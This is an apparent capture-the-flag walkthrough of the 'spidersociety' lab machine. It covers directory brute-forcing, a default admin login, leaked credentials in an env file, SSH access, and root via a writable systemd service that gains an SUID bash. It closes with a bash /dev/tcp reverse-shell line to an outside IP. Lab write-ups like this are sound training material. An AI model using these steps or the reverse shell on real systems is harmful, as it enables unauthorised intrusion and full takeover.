nmap shows ports 22, 80 web, 2121 ftp open
ftp dont gots anonymous
nothing on main webpage, so we dirb
`gobuster dir --url http://192.168.110.214 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64`
After some time, we find the /libspider page, which is a login page
admin:admin works, and there's 3 things
```
## New Message from Tech Dept
We created your new backup user. Store these credentials safely, agent.
**Username:** ss_ftpbckuser
**Password:** ss_WeLoveSpiderSociety_From_Tech_Dept5937!
```
looked at the code of webpage, and it seems to be using 'fetch-credentials.php'

we get on with it, and login to ftp
`ftp IP 2121`
we see in the code for fetch-credentials.php, and in another file, it references this as `__DIR__` or env var. `/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv`
I tried visiting `http://192.168.110.214/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv`
But there was nothing there

HINT TAKE :  use ls -l for ftp listings, always
when we do that, we see the file in /libspider, upon visiting it in browzer, we finally see creds for another user
```
FTP_BACKUP_USER=ss_ftpbckuser
FTP_BACKUP_PASS=ss_WeLoveSpiderSociety_From_Tech_Dept5937!

DB_CONNECT_USER=spidey
DB_CONNECT_PASS=WithGreatPowerComesGreatSecurity99!
```
`ssh spidey@ip`
spidey!

---
sudo -l shows
```
User spidey may run the following commands on spidersociety:
    (ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) !/bin/bash, !/bin/sh, !/bin/su, !/usr/bin/sudo
```

so we look for writable service
`find /etc/systemd/system/ -writable -type f 2>/dev/null`
it shows /etc/systemd/system/spiderbackup.service
Looking into the file,
```svc
[Unit]
Description=Spider Society Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/spiderbackup.sh
User=root
Group=root

[Install]
WantedBy=multi-user.target
```
since we can modify it and restart it, we just need to modify the ExecStart

Create a file that sends a reverse shell. ( a fifo nc rev shell) /dev/shm/rev.sh
`ExecStart=/bin/sh -c "bash /dev/shm/rev.sh"` - DID NOT WORK

`ExecStart=/usr/bin/chmod u+s /bin/bash` ---> /bin/bash -p 

Then restart the service
`/bin/systemctl restart spiderbackup.service`
`/bin/bash -p`
root!

---
```bash
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.1.69/6969 0>&1"
```